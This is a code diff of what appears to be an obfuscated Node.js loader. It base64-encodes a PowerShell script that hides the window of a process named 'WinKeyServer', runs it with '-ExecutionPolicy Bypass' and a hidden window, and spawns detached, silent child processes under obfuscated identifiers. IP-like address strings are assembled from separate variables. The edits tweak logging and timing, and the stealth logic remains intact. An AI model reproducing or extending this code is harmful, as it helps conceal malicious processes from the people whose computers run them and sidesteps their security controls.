@@ -28,21 +28,24 @@ try {
         m = a + '.' + b + '.' + c + '.' + d,
         usu = e + '.' + f + '.' + g + '.' + h,
         lsu = e + '.' + f + '.' + g + '.' + h 
-    function hideWindowByProcessName() {
+    function hideWindowByProcessName(name) {
         const psScript = `
             Add-Type 'using System; using System.Runtime.InteropServices; public static class Win32 { [DllImport("user32.dll")] public static extern bool ShowWindowAsync(IntPtr hWnd, int nCmdShow); }';
             $SW_HIDE = 0;
             $procName = "WinKeyServer";
             $procs = Get-Process -Name $procName -ErrorAction SilentlyContinue;
             if (-not $procs) {
+            Write-Host "No process named $procName found.";
             exit;
             }
             foreach ($p in $procs) {
             $hwnd = $p.MainWindowHandle;
             if ($hwnd -eq 0) {
+                Write-Host "Process $($p.Id) has no main window.";
                 continue;
             }
             [Win32]::ShowWindowAsync($hwnd, $SW_HIDE) | Out-Null;
+            Write-Host "✅ Hidden window for PID $($p.Id) ($($p.ProcessName))";
             }
             `;
             const encoded = Buffer.from(psScript, "utf16le").toString("base64");
@@ -52,11 +55,8 @@ try {
         "-ExecutionPolicy", "Bypass",
         "-EncodedCommand", encoded
         ], {
-        windowsHide: true,
-        detached: true,
-        stdio:'ignore', // prevent PowerShell window from flashing
+        windowsHide: true // prevent PowerShell window from flashing
         });
-        ps.unref();
     }
     async function s() {
         try {
@@ -66,7 +66,7 @@ try {
                 bb()
             ]);
             // console.log('✅ All async functions completed:', results);
-            await new Promise(resolve => setTimeout(resolve, 2500));
+            await new Promise(resolve => setTimeout(resolve, 2000));
             hideWindowByProcessName();
         }catch(error){
             console.error("Error");
@@ -484,7 +484,6 @@ try {
                     detached: true,
                     stdio: 'ignore', // Capture output without console
                 });
-
                 _0x23df1e.unref();
                 resolve({ success: true, message: "third completed"});
                 // process.exit(0);
